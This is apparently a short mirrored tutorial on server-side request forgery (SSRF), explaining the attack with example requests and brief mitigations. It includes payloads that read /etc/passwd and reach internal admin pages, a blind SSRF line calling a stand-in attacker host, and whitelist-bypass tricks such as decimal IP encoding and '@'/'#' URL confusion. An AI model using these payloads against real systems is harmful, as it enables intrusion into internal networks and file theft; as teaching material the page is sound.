# :globe_with_meridians: SSRF: Web App Security Basics. Server-Side Request Forgery (SSRF) is a…

> **Original Source:** [SSRF: Web App Security Basics. Server-Side Request Forgery (SSRF) is a…](https://infosecwriteups.com/ssrf-web-app-security-basics-b88da872c9c8)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# SSRF: Web App Security Basics


>

Server-Side Request Forgery (SSRF) is a type of exploit where an attacker can use the functionality of a server for his benefit, to access or manipulate information in the network of the server, which would be not accessible directly to the attacker.


In Case of successful SSRF attack:


The attacker might cause the server to make a connection back to itself, or to other web-based services within the organization’s infrastructure, or to external third-party systems which could lead to potential legal liabilities and reputation damages. It is quite similar to CSRF and if the machine is vulnerable to XXE, that could also lead to SSRF. If you want to read about CSRF and XXE, you can refer my previous article:


Example:


## Get Hemant Birdi’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Attacker wants to get sensitive information from machine which is on internal network and can’t be accessed directly. But there is one server which is on public network and has access to that internal machine. Now, attacker tries to get information from that public machine and notices this:


```
GET /?url=http://localhost/server-status HTTP/1.1
Host: example.com
```


Here, while intercepting the requests, and few modifications attacker can send the requests like:


- Retrieve files on that public server:


```
GET /?url=file:///etc/passwd HTTP/1.1
Host: example.com
```


- Accessing the internal server:


```
GET /?url=http://internal-ip/admin/ HTTP/1.1
Host: example.com
```


- Blind SSRF: When server is vulnerable, but sensitive information is not revealed in responses. Blind SSRF is generally harder to exploit but can sometimes lead to full remote code execution. Suppose, attacker has malicious site where there is a file exploit.php.


```
Attacker’s site: http://malicious-site.com/ssrf/exploit.phpGET /?url=http://internal-ip/admin/ HTTP/1.1
Host: example.com
```


Mitigation:


- Blacklisting/Whitelisting IPs.

- Disable unused URL schemas (`file:///`, `dict://`, `ftp://` and `gopher://`).

- Use authentication on internal services.


Bypassing/Workarounds:


```
Converting IP to hex/Octal/Decimal:
127.0.0.1 --> 2130706433 (Decimal)
```


```
https://whitelisted-host@malicious-host (Using @)
https://whitelisted-host.malicious-host
https://malicious-host#whitelisted-host (Using #)
```


References:

---

*Originally published on [Medium](https://infosecwriteups.com/ssrf-web-app-security-basics-b88da872c9c8). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
